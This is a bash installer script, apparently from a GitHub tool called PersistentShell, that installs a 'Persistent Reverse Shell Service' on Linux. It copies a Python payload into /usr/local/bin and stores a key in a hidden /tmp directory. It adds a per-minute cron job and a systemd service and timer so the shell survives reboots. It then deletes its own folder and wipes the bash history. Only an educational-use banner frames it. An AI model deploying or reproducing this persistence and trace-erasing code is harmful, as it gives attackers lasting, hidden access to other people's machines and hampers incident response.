#!/bin/bash

# Display the terms of use
cat <<EOF

   _ \                  _)        |                 |     ___|   |            |  | 
  |   |  _ \   __|  __|  |   __|  __|   _ \  __ \   __| \___ \   __ \    _ \  |  | 
  ___/   __/  |   \__ \  | \__ \  |     __/  |   |  |         |  | | |   __/  |  | 
 _|    \___| _|   ____/ _| ____/ \__| \___| _|  _| \__| _____/  _| |_| \___| _| _| 
                                                                                   
                         https://github.com/byfranke

Terms of Use

This tool is designed solely for educational and testing purposes. The creator strongly discourages and disclaims any liability for its use in unauthorized or malicious activities. Always obtain explicit permission before deploying this tool in any environment.

Do you accept the terms of use? [y/n]
EOF

# Loop until the user provides a valid input
while true; do
    read -p "Enter your choice [y/n]: " user_choice
    case $user_choice in
        [Yy]* )
            echo "You have accepted the terms of use. Continuing with the installation..."
            break # Exit the loop and continue the script
            ;;
        [Nn]* )
            echo "You have not accepted the terms of use. Exiting..."
            exit 1
            ;;
        * )
            echo "Invalid choice, please enter 'y' for Yes or 'n' for No."
            ;;
    esac
done

# Variables
SERVICE_NAME=persistence
TIMER_NAME=${SERVICE_NAME}.timer
SERVICE_DESCRIPTION="Persistent Reverse Shell Service"
TIMER_DESCRIPTION="Timer for ${SERVICE_NAME}"
EXEC_PATH="/usr/bin/python3 /usr/local/bin/persistence"
KEY_PATH="/tmp/.config/key"

# Ask for the encryption key
read -p "Enter the encryption key: " encryption_key

# Check if /tmp/.config exists, if not, create it
[ ! -d "/tmp/.config" ] && mkdir -p "/tmp/.config"

# Save the key
echo $encryption_key > $KEY_PATH

# Path where the Python script will be copied
TARGET_DIR="/usr/local/bin"

# Install the cryptography package
echo "Installing the cryptography Python package..."
sudo apt install python3-pip
sudo apt install python3-cryptography
pip3 install cryptography

# Copy the script to the target directory
echo "Copying persistence.py to $TARGET_DIR..."
cp persistence.py $TARGET_DIR/persistence

# Make the script executable
echo "Setting executable permissions for persistence.py..."
chmod +x $TARGET_DIR/persistence

# Execute Encrypt.py
echo "Executing Encrypt.py..."
python3 encrypt.py

# Add cron job to execute persistence.py every minute
(crontab -l 2>/dev/null; echo "* * * * * $EXEC_PATH") | crontab -

# Create the systemd service file for persistence.py
echo "Creating systemd service file for $SERVICE_NAME..."
cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=$SERVICE_DESCRIPTION
After=network.target

[Service]
ExecStart=$EXEC_PATH
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

# Adjusting the systemd timer file for execution every 1 minute
echo "Creating systemd timer file for $TIMER_NAME..."
cat <<EOF > /etc/systemd/system/$TIMER_NAME
[Unit]
Description=$TIMER_DESCRIPTION

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=$SERVICE_NAME.service

[Install]
WantedBy=timers.target
EOF

# Enable and start the timer
echo "Enabling and starting $TIMER_NAME..."
systemctl enable $TIMER_NAME
systemctl start $TIMER_NAME

echo "$TIMER_NAME installed and started."

#!/bin/bash

# Prompt to delete the current working directory
read -p "Do you wish to delete the current directory ($PWD)? [y/n]: " del_choice

case $del_choice in
    [Yy]* )
        echo "Deleting the current directory..."
        # Move up a directory to avoid issues with deleting the current directory
        cd ..
        # Delete the directory
        rm -rf "$PWD/persistentshell"
        echo "Directory deleted."
        
        # Clean up command history after confirming deletion
        echo "Cleaning up terminal command history..."
        history -c && > ~/.bash_history
        echo "Command history cleaned."
        ;;
    [Nn]* )
        echo "Directory not deleted."
        ;;
    * )
        echo "Invalid choice. Directory not deleted."
        ;;
esac

echo "Installation complete."
